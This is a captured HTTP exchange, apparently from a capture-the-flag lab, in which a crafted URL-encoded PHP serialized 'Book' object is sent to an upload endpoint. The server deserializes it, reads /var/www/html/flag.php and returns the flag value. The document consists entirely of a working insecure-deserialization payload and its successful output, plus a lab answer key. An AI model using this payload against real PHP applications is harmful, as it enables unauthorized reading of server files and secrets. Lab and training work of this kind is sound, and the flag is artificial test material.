PUT /upload.php HTTP/1.1
Host: web-80-164-90.cod-sa-east-1.hbtn.io
Cookie: PHPSESSID=cd6c3d6d85ed42c37c8891d9ce85acf0
Content-Type: application/x-www-form-urlencoded
Content-Length: 274
Connection: keep-alive

fileToUpload=O%3A4%3A%22Book%22%3A4%3A%7Bs%3A5%3A%22title%22%3Bs%3A14%3A%22Exploited+Book%22%3Bs%3A6%3A%22author%22%3Bs%3A8%3A%22Attacker%22%3Bs%3A10%3A%22cover_path%22%3Bs%3A22%3A%22%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3Bs%3A11%3A%22cover_image%22%3BN%3B%7D&submit=Upload+File

Response:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 06 Jun 2026 19:36:08 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 250
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding

The file O has been uploaded.<br>Deserialized data: <pre>Book Object
(
    [title] => Exploited Book
    [author] => Attacker
    [cover_path] => /var/www/html/flag.php
    [cover_image] => <?php
$flag="2b6ac3ed2d74b048db15e0c7d116c581";
?>

)
</pre>
